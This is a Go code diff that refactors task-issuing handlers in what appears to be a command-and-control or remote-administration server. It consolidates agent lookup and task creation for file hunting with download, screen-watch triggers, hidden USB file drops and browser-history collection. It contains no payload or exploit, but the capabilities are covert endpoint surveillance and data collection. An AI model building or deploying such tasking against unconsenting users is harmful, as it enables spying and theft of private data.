@@ -58,9 +58,6 @@ func (s *Server) handleFileHunt(c *gin.Context) {
 		d := strings.ToLower(c.PostForm("download"))
 		req.Download = d == "1" || d == "true" || d == "yes"
 	}
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
 	var parts []string
 	if req.Download {
 		parts = append(parts, "download=1")
@@ -75,9 +72,8 @@ func (s *Server) handleFileHunt(c *gin.Context) {
 		parts = append(parts, "max_depth="+strconv.Itoa(req.MaxDepth))
 	}
 	data := strings.Join(parts, ",")
-	task, err := s.createTask(id, "file_hunt", pattern, "", req.Path, data, 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "file_hunt", Command: pattern, Path: req.Path, Data: data})
+	if task == nil {
 		return
 	}
 	slog.Info("File hunt requested", "agent_id", id, "path", req.Path, "pattern", pattern, "download", req.Download)
@@ -113,12 +109,8 @@ func (s *Server) handleScreenTriggerStart(c *gin.Context) {
 	if req.Interval > 0 {
 		match = fmt.Sprintf("%s,%d", match, req.Interval)
 	}
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "screen_trigger_start", match, "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "screen_trigger_start", Command: match})
+	if task == nil {
 		return
 	}
 	s.dispatchTask(c, task, "screen_trigger_start", match)
@@ -161,12 +153,8 @@ func (s *Server) handleUSBDrop(c *gin.Context) {
 	if req.Hide {
 		data = "hide=1"
 	}
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "usb_drop", dest, "", src, data, 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "usb_drop", Command: dest, Path: src, Data: data})
+	if task == nil {
 		return
 	}
 	s.LogAuditRecord(c, "usb_drop", "agent", id, "USB drop "+src+" -> "+dest, true, nil)
@@ -193,12 +181,8 @@ func (s *Server) handleBrowserHistory(c *gin.Context) {
 	if browser == "" {
 		browser = "all"
 	}
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "browser_history", browser, "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "browser_history", Command: browser})
+	if task == nil {
 		return
 	}
 	s.dispatchTask(c, task, "browser_history", "Browser history: "+browser)
